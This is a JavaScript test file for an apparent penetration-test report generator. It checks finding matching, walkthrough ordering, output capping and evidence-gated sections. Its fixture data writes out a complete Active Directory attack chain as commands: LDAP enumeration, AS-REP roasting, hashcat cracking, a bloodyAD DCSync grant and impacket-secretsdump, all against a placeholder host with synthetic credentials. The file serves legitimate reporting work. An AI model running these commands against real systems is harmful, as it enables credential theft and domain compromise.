/* Report narrative + catalog integration: the findings catalog matches proven facts to report-worthy
 * weaknesses, and the per-machine walkthrough renders each ACTUALLY-PERFORMED technique with its narrative,
 * the real ledger commands (in run order), severity, and remediation - while capability-only findings
 * (golden ticket, spraying) stay in Findings, not the walkthrough. Huge command output is capped. Generic
 * data (corp.local, synthetic hashes) - validates the PIPELINE, not any one lab. */
'use strict';
var fs = require('fs'), path = require('path');
var ROOT = path.join(__dirname, '..', '..'), ENG = path.join(ROOT, 'assets', 'engine');
require(path.join(ENG, 'facts.js'));
require(path.join(ENG, 'phases.js'));
require(path.join(ENG, 'pack.js'));
require(path.join(ENG, 'profile.js'));
require(path.join(ROOT, 'data', 'findings-catalog.js'));
require(path.join(ROOT, 'data', 'narratives.js'));
require(path.join(ENG, 'findings.js'));
require(path.join(ENG, 'report.js'));
var OBOL = globalThis.OBOL, F = OBOL.facts;

var fail = 0;
function ok(c, m) { if (!c) { console.error('  FAIL:', m); fail++; } else { console.log('  ok  :', m); } }

var HOST = '10.0.0.5';
function fact(kind, value) { return F.makeFact({ kind: kind, scope: 'host:' + HOST, value: value || {}, state: F.ProofState.SUPPORTED, source: '' }); }
var factset = new F.FactSet([
  fact('host.up'), fact('ports.open'), fact('os.windows'),
  fact('ad.domain_known', { domain: 'corp.local' }), fact('ad.anonymous_bind'),
  fact('ad.user_list', { users: ['svc-web', 'admin'] }),
  fact('hash.asrep', { user: 'svc-web' }), fact('credential.plaintext', { user: 'svc-web', password: 'Winter2026' }),
  fact('smb.authenticated', { user: 'svc-web', domain: 'corp.local' }),
  fact('ad.control_paths', { principal: 'svc-web' }),
  fact('loot.ntds'), fact('hash.krbtgt', { hash: 'aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa' }), fact('hash.ntlm', { user: 'Administrator' }),
  fact('access.admin', { user: 'Administrator' }), fact('winrm.authenticated', { user: 'Administrator' }),
  fact('smb.smbv1', { enabled: true }),
  fact('objective.local_flag', { flag: 'aaaa1111bbbb2222cccc3333dddd4444', slot: 'local', name: 'user.txt' }),
  fact('objective.root_flag', { flag: 'ffff9999eeee8888dddd7777cccc6666', slot: 'root', name: 'root.txt' }),
]);

// 1) The catalog surfaces the whole set of proven weaknesses (not just one).
var matched = OBOL.findings.assess(factset);
ok(matched.length >= 6, 'the catalog surfaces many findings from the proven facts (got ' + matched.length + ')');
var titles = matched.map(function (m) { return m.title; }).join(' | ');
['AS-REP Roasting', 'DCSync Replication Abuse', 'Dangerous Active Directory ACLs', 'Anonymous LDAP Bind / Domain Enumeration'].forEach(function (tt) {
  ok(titles.indexOf(tt) >= 0, 'catalog matched: ' + tt);
});

// 2) The walkthrough renders the performed techniques in run order, with real commands.
var hugeOut = new Array(9000).join('row of bloodhound json\n'); // ~9k lines
var activities = [
  { command: "nxc ldap 10.0.0.5 -u '' -p '' --users", stdout: 'svc-web\nadmin', produced: ['ad.user_list', 'ad.anonymous_bind'], at: 1 },
  { command: "nxc ldap 10.0.0.5 -u users.txt -p '' --asreproast asrep.txt", stdout: '$krb5asrep$...', produced: ['hash.asrep'], at: 2 },
  { command: 'hashcat -m 18200 asrep.txt rockyou.txt', stdout: 'svc-web:Winter2026', produced: ['credential.plaintext'], at: 3 },
  { command: "nxc smb 10.0.0.5 -u svc-web -p 'Winter2026'", stdout: '[+] corp.local\\svc-web', produced: ['smb.authenticated'], at: 4 },
  { command: "bloodyAD -d corp.local --host 10.0.0.5 -u svc-web -p 'Winter2026' add dcsync svc-web", stdout: '[+] dcsync granted', produced: ['ad.control_paths'], at: 5 },
  { command: "impacket-secretsdump 'corp.local/svc-web:Winter2026'@10.0.0.5", stdout: hugeOut, produced: ['loot.ntds', 'hash.krbtgt', 'hash.ntlm'], at: 6 },
];
var rc = OBOL.report.buildContext({
  facts: factset, activities: activities, targets: [{ ip: HOST, host: HOST, hostname: 'DC01', domain: 'corp.local', os: 'windows' }],
  params: { target: HOST, domain: 'corp.local' }, includeSecrets: true, platform: 'oscp', candidate: 'Tester', osid: 'OS-00000',
});
var md = OBOL.report.toMarkdown(OBOL.report.document('oscp', rc));
var heads = md.split('\n').filter(function (l) { return /^##### /.test(l); });
ok(heads.some(function (h) { return /AS-REP Roasting/.test(h); }), 'walkthrough renders the AS-REP Roasting technique');
ok(heads.some(function (h) { return /DCSync/.test(h); }), 'walkthrough renders the DCSync technique');
ok(heads.some(function (h) { return /Dangerous Active Directory ACLs/.test(h); }), 'walkthrough renders the ACL-abuse technique');
ok(!heads.some(function (h) { return /Golden Ticket/.test(h); }), 'a capability-only finding (Golden Ticket) is NOT a walkthrough step');
ok(md.indexOf('nxc ldap 10.0.0.5 -u users.txt') >= 0 && md.indexOf('impacket-secretsdump') >= 0, 'the real ledger commands appear as reproduction steps');
// run order: AS-REP before ACL before DCSync
var iAsrep = md.indexOf('AS-REP Roasting'), iAcl = md.indexOf('Dangerous Active Directory ACLs'), iDc = md.indexOf('DCSync Replication');
ok(iAsrep < iAcl && iAcl < iDc, 'techniques read in chronological run order (AS-REP → ACL → DCSync)');

// 3) The 9k-line dump is capped, not dumped verbatim.
ok(md.indexOf('lines omitted') >= 0, 'a huge command output is capped with an omission marker');
ok((md.match(/row of bloodhound json/g) || []).length < 60, 'the 9,000-line dump is not rendered in full (< 60 lines survive)');

// 4) Expanded parser-minted facts match catalog entries and narratives.
var expandedFacts = new F.FactSet([
  fact('host.up'),
  fact('ad.adcs.vulnerable_template', { template: 'ESC1-Template' }),
  fact('smb.vuln.ms17_010', { cve: 'CVE-2017-0143' }),
  fact('ad.nopac', { vulnerable: true }),
  fact('ad.maq', { count: 10 }),
  fact('ftp.anonymous', { allowed: true }),
  fact('smb.writable_share', { share: 'Backups' }),
  fact('hash.dcc2', { user: 'administrator' }),
  fact('dns.zone_transfer', { domain: 'corp.local' }),
  fact('web.SensitiveFile', { path: '/.env' }),
  fact('privesc.token_priv', { privilege: 'SeImpersonatePrivilege' }),
]);
var expandedMatched = OBOL.findings.assess(expandedFacts).map(function (m) { return m.key; });
[
  'adcs-template-abuse',
  'smb-ms17-010-smbghost',
  'ad-printnightmare-nopac-coercion',
  'ad-machine-account-quota-sid-history',
  'ftp-anonymous-access',
  'smb-writable-or-sensitive-share',
  'domain-cached-credentials-mscache',
  'dns-zone-transfer-smtp-relay',
  'exposed-sensitive-file',
  'seimpersonate-potato',
].forEach(function (expectedKey) {
  ok(expandedMatched.indexOf(expectedKey) >= 0, 'expanded parser fact matched catalog key: ' + expectedKey);
});

// 5) Command-less paste (Tier 2/3 shape/inference) and causal_entailment gate-backfill handling.
var H2 = '10.0.0.9';
function fact2(kind, value, src, at) {
  return F.makeFact({ kind: kind, scope: 'host:' + H2, value: value || {}, state: F.ProofState.SUPPORTED, source: src || 'paste', created_at: at || 1 });
}
var cmdlessFacts = new F.FactSet([
  fact2('host.up', {}, 'paste', 1),
  fact2('ad.adcs.vulnerable_template', { template: 'CorpUserESC1', via: 'shape', confidence: 'high' }, 'paste', 2),
  fact2('foothold.shell', { via: 'causal_entailment', inferred: true }, 'sudo -l', 3),
  fact2('privesc.sudo_nopasswd', { entry: '(ALL) NOPASSWD: /usr/bin/find', via: 'shape' }, 'paste', 3),
  fact2('access.system', { user: 'root' }, 'paste', 4),
]);
var cmdlessActs = [
  { command: '', dispatch: 'adcs_', stdout: 'Certificate Authorities\n  Template Name: CorpUserESC1\n  [!] Vulnerabilities\n    ESC1: Enrollee supplies subject', produced: ['ad.adcs.vulnerable_template'], target: H2, scope: 'host:' + H2, at: 2 },
  { command: '', dispatch: 'lin_', stdout: 'Matching Defaults entries for svc on host:\nUser svc may run the following commands on host:\n    (ALL) NOPASSWD: /usr/bin/find', produced: ['privesc.sudo_nopasswd'], target: H2, scope: 'host:' + H2, at: 3 },
  { command: '', dispatch: 'lin_', stdout: 'uid=0(root) gid=0(root) groups=0(root)', produced: ['access.system'], target: H2, scope: 'host:' + H2, at: 4 },
];
var cmdlessCtx = OBOL.report.buildContext({
  facts: cmdlessFacts,
  activities: cmdlessActs,
  targets: [{ ip: H2, host: H2, hostname: 'APP01', os: 'linux' }],
  params: { target: H2 },
  includeSecrets: true,
  platform: 'oscp',
});
var cmdlessMd = OBOL.report.toMarkdown(OBOL.report.document('oscp', cmdlessCtx));
ok(cmdlessMd.indexOf('certipy (pasted output)') >= 0, 'command-less ADCS paste recovers "certipy (pasted output)" command label');
ok(cmdlessMd.indexOf('ESC1: Enrollee supplies subject') >= 0, 'command-less paste terminal output is preserved in techniqueWriteup');
ok(cmdlessMd.indexOf('by running `paste`') === -1, '"paste" source is never rendered as a literal CLI command');
ok(cmdlessMd.indexOf('causal_entailment') === -1 && cmdlessMd.indexOf('inferred: yes') === -1, 'internal engine metadata (via: causal_entailment, inferred) never leaks into report prose');

// 6) Progressive / Evidence-Gated Report Preview (hideUnreached: true)
var emptyCtx = OBOL.report.buildContext({
  facts: new F.FactSet([]),
  activities: [],
  targets: [{ ip: '10.10.10.99', host: '10.10.10.99' }],
  params: { name: 'empty-lab', target: '10.10.10.99' },
  includeSecrets: true,
  hideUnreached: true,
  platform: 'oscp',
});
var emptyBlocks = OBOL.report.document('oscp', emptyCtx);
var emptyMd = OBOL.report.toMarkdown(emptyBlocks);
ok(emptyMd.indexOf('No engagement evidence recorded yet.') >= 0, 'empty engagement with hideUnreached=true shows clean empty-state callout');
ok(emptyMd.indexOf('## Recommendations') === -1 && emptyMd.indexOf('## Per-Machine Walkthrough') === -1, 'empty engagement with hideUnreached=true omits unreached sections');

var reconFacts = new F.FactSet([
  F.makeFact({ kind: 'host.up', scope: 'host:10.10.10.50', value: {}, state: F.ProofState.SUPPORTED, source: 'nmap -sC -sV 10.10.10.50', created_at: 1 }),
  F.makeFact({ kind: 'port:80', scope: 'host:10.10.10.50', value: { protocol: 'tcp', service: 'http' }, state: F.ProofState.SUPPORTED, source: 'nmap -sC -sV 10.10.10.50', created_at: 1 }),
]);
var reconCtx = OBOL.report.buildContext({
  facts: reconFacts,
  activities: [{ tool: 'nmap', command: 'nmap -sC -sV 10.10.10.50', stdout: '80/tcp open http', produced: ['host.up', 'port:80'], target: '10.10.10.50', scope: 'host:10.10.10.50', at: 1 }],
  targets: [{ ip: '10.10.10.50', host: '10.10.10.50', os: 'Linux' }],
  params: { name: 'recon-only', target: '10.10.10.50' },
  includeSecrets: true,
  hideUnreached: true,
  platform: 'oscp',
});
var reconMd = OBOL.report.toMarkdown(OBOL.report.document('oscp', reconCtx));
ok(reconMd.indexOf('#### Service Enumeration') >= 0, 'recon-only engagement with hideUnreached=true shows Service Enumeration');
ok(reconMd.indexOf('#### Initial Access') === -1 && reconMd.indexOf('#### Privilege Escalation') === -1 && reconMd.indexOf('#### Post-Exploitation / Proof') === -1, 'recon-only engagement with hideUnreached=true omits unreached Initial Access, Privilege Escalation, and Post-Exploitation subsections');
ok(reconMd.indexOf('### Maintaining Access') === -1 && reconMd.indexOf('### House Cleaning') === -1, 'recon-only engagement with hideUnreached=true omits unreached Maintaining Access and House Cleaning methodology claims');
ok(reconMd.indexOf('## Recommendations') === -1, 'recon-only engagement with zero findings and hideUnreached=true omits canned boilerplate Recommendations');

console.log(fail ? ('\nREPORT NARRATIVE: ' + fail + ' FAILURES') : '\nREPORT NARRATIVE: all passed');
process.exit(fail ? 1 : 0);
